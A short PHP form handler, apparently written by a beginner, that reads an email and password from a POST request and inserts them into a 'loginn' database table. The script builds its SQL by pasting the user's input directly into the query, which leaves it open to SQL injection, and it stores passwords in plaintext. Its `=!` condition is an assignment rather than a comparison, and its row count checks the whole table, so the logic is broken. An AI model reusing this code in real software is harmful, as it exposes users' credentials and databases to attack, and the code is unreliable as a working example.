<?php include("connect.php");
header('location: index.php');


$email = $_POST['email'];
$password = $_POST['password'];
 

 $sql = "SELECT * FROM loginn";
$result = mysqli_query($conn,$sql);

$num = mysqli_num_rows($result);

if($num =! 1){
    echo "Your Message?";
}
else{
    $reg = "INSERT INTO loginn (email,password) VALUES ('$email','$password')";
    mysqli_query($conn,$reg);
    echo "Message Received";
}

?>